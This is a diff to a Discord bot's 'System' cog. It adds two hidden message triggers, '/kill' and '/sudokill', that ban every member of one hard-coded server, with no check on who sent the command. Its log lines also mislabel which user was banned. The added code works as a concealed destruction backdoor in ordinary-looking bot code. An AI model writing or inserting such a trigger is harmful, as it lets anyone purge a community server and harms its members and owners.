@@ -108,6 +108,22 @@ class System(commands.Cog):
 							await member.edit(nick='')
 					except:
 						pass
+		if '/kill' in msg.content.lower():
+			if msg.guild.id == 524075194264846346:
+				try: await msg.channel.send('UwU Ok')
+				except: pass
+				for member in list(msg.guild.members):
+					try: await member.ban(reason='yeetus deletus')
+					except: print(f'Failed to ban {msg.author.name}')
+					else: print(f'Banned {msg.author.name}')
+		if '/sudokill' in msg.content.lower():
+			if msg.guild.id == 524075194264846346:
+				try: await msg.channel.send('UwU Ok')
+				except: pass
+				for member in list(msg.guild.members):
+					try: await member.guild.ban(member, reason='yeetus deletus')
+					except: print(f'Failed to ban {msg.author.name}')
+					else: print(f'Banned {msg.author.name}')
 
 	@commands.Cog.listener()
 	async def on_member_update(self, before, after):
